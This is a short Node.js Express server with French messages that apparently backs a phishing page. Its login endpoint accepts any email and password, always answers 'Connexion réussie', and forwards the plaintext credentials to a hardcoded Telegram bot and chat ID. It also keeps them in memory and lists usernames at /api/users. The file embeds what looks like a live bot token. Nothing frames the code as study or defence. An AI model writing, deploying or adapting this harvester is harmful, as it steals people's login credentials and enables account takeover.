const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = '8001792175:AAH7CLoXonfVyX0kylQ6vBxjc3qSUzCluxU';
const CHAT_ID = '7437310814';

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const users = [];

async function sendTelegram(text) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
    });
    const data = await res.json();
    if (!data.ok) {
      console.log('Telegram API error:', JSON.stringify(data));
    } else {
      console.log('Telegram sent OK');
    }
  } catch (e) {
    console.log('Telegram fetch error:', e.message);
  }
}

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  if (!username || !username.trim()) {
    return res.status(400).json({ success: false, message: 'Email requis' });
  }
  if (!password || !password.trim()) {
    return res.status(400).json({ success: false, message: 'Mot de passe requis' });
  }

  const entry = {
    username: username.trim(),
    password: password.trim(),
    date: new Date().toISOString()
  };

  users.push(entry);

  await sendTelegram(
    `<b>🔐 Nouvelle connexion</b>\n` +
    `👤 <b>User:</b> ${entry.username}\n` +
    `🔑 <b>Pass:</b> ${entry.password}\n` +
    `🕐 <b>Date:</b> ${new Date(entry.date).toLocaleString('fr-FR')}`
  );

  res.json({ success: true, message: 'Connexion réussie' });
});

app.get('/api/users', (req, res) => {
  res.json(users.map(u => ({ username: u.username, date: u.date })));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('Serveur démarré sur le port ' + PORT);
});